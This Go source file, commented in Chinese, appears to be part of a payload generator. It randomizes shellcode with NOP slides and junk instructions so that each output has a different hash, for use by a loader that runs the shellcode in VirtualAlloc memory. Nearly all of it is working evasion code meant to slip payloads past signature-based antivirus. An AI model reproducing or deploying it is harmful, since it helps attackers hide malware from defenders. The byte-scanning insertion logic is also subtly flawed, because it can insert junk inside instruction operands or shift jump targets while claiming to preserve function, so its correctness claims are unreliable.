package main

import (
	"math/rand"
)

// ============ Shellcode 随机化混淆 ============
// 思路: 在不改变 shellcode 执行逻辑的前提下，插入随机垃圾字节/NOP 滑动/等价指令
// 确保每次生成的 shellcode 字节序列不同（MD5 不同）
//
// x86/x64 安全的垃圾指令（不影响寄存器/标志位）:
//   0x90                NOP (1 字节)
//   0x66, 0x90          66 90 (2 字节 NOP)
//   0x0f, 0x1f, 0x00    15 字节 NOP 系列之一
//   0xeb, 0x00          jmp +0 (跳到下一条，2 字节，不影响任何状态)
//
// 等价寄存器清零变换（任选其一）:
//   xor rax, rax    48 31 c0
//   sub rax, rax    48 29 c0
//   mov rax, 0      48 c7 c0 00 00 00 00

// x64NopSlides 多种等价 NOP 指令序列（x86/x64 安全）
var x64NopSlides = [][]byte{
	{0x90},                          // NOP
	{0x66, 0x90},                    // 66 90
	{0x0f, 0x1f, 0x00},              // 7-byte NOP 系列之一（3 字节版）
	{0x0f, 0x1f, 0x40, 0x00},        // 4 字节 NOP
	{0x0f, 0x1f, 0x44, 0x00, 0x00},  // 5 字节 NOP
	{0xeb, 0x00},                    // jmp +0
	{0x87, 0xc0},                    // xchg eax, eax (等价 NOP)
}

// safeJunkInstructions 安全垃圾指令（不影响执行流的等价指令）
// 这些指令执行后不会改变任何后续指令依赖的状态
var safeJunkInstructions = [][]byte{
	{0x90},                          // NOP
	{0x66, 0x90},                    // 2-byte NOP
	{0x0f, 0x1f, 0x00},              // 3-byte NOP
	{0xeb, 0x00},                    // jmp +0
	{0x89, 0xc0},                    // mov eax, eax (等价 NOP，x86)
	// 注意: 不能用 push/pop（改变栈），不能用 xor（改变标志位）
}

// randomNopSlide 返回一个随机的 NOP 滑动序列
func randomNopSlide() []byte {
	return x64NopSlides[rand.Intn(len(x64NopSlides))]
}

// randomJunkInstruction 返回一个随机的安全垃圾指令
func randomJunkInstruction() []byte {
	return safeJunkInstructions[rand.Intn(len(safeJunkInstructions))]
}

// obfuscateShellcode 对 shellcode 进行随机化混淆
// 策略:
//   1. 前置随机 NOP 滑动（3-15 个随机 NOP 指令）
//   2. 在指令间隙随机插入垃圾指令（概率 30%）
//   3. 尾部追加随机垃圾字节
// 这些操作不改变 shellcode 功能，但使字节序列每次不同
func obfuscateShellcode(sc []byte) []byte {
	if len(sc) == 0 {
		return sc
	}

	var result []byte

	// 1. 前置随机 NOP 滑动（3-15 条随机 NOP 指令）
	nopCount := 3 + rand.Intn(13)
	for i := 0; i < nopCount; i++ {
		result = append(result, randomNopSlide()...)
	}

	// 2. 复制原始 shellcode，在指令间隙随机插入垃圾指令
	// 为简化实现（避免解析 x86 指令边界），采用按字节扫描 + 概率插入
	// 插入点: 遇到 0x0f 0x05 (syscall) 或 0xc3 (ret) 等指令结束后，有概率插入垃圾
	for i := 0; i < len(sc); i++ {
		result = append(result, sc[i])

		// 检测 syscall (0x0f 0x05) 指令结束位置
		if i+1 < len(sc) && sc[i] == 0x0f && sc[i+1] == 0x05 {
			result = append(result, sc[i+1]) // 写入 0x05
			i++                              // 跳过 0x05
			// 30% 概率在 syscall 后插入垃圾
			if rand.Intn(100) < 30 {
				result = append(result, randomJunkInstruction()...)
			}
			continue
		}

		// 检测 ret (0xc3) 指令
		if sc[i] == 0xc3 {
			// 20% 概率在 ret 后插入垃圾
			if rand.Intn(100) < 20 {
				result = append(result, randomJunkInstruction()...)
			}
		}
	}

	// 3. 尾部追加随机垃圾字节（3-10 个随机 NOP）
	tailCount := 3 + rand.Intn(8)
	for i := 0; i < tailCount; i++ {
		result = append(result, randomNopSlide()...)
	}

	return result
}

// obfuscateShellcodeForLoader 为 exe_loader 格式混淆 shellcode
// exe_loader 会用 VirtualAlloc 分配内存并跳转执行，所以前置 NOP 滑动是安全的
// 策略与 obfuscateShellcode 一致
func obfuscateShellcodeForLoader(sc []byte) []byte {
	return obfuscateShellcode(sc)
}
